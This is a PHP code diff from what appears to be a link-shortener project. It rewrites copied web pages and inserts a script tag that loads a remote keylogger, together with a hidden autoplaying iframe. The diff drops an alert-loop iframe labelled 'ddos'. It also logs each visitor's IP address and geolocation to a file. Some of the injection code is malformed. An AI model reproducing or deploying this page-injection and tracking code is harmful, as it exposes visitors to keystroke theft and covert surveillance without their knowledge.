@@ -2,6 +2,7 @@
 include "../scripts/simple_html_dom.php" ;
 include "../php/DataBaseHandling.php";
 
+
 $conn = openConnection();
 //SEARCHING DATABASE WITH KEY TO GET LONGLINK
 $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
@@ -24,7 +25,6 @@ foreach($html->find('img') as $element){
       if (!is_dir("$img")){
           $path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
           mkdir(getcwd().$path , 0777 , true);
-          echo $link.$img;
           copy($link.$img , getcwd().$img);
       }
       else{
@@ -37,7 +37,7 @@ foreach($html->find('img') as $element){
 //ADDING RICKROLL ATTACK TEST
 $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
 $ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
-$textToInsert="script src='$keyloggerscript'></script>".$ddosscript."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+$textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
 file_put_contents($htmlFileName, $newContent);
@@ -50,14 +50,14 @@ getenv('HTTP_X_FORWARDED')?:
 getenv('HTTP_FORWARDED_FOR')?:
 getenv('HTTP_FORWARDED')?:
 getenv('REMOTE_ADDR');
-$data = fopen("../public_html/data.txt" , "w");
-$check = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true");
 
-fwrite($data ,"\n"."$ip"."$check"." says: ");
-fclose($data);
+//depends on location / this ip for good result 12.215.42.19 ;
+ $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says ";
+ $logfile = fopen('../php/data.txt', 'a+');
+ fwrite($logfile, $data );
+ fclose($logfile);
 
-echo gethostbyaddr("$ip");
-echo "\n".$ip."\n";
+
 //depends on location / this ip for good result 12.215.42.19 ;
 //$check = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true");
 //REDIRECTING TO LONG LINK
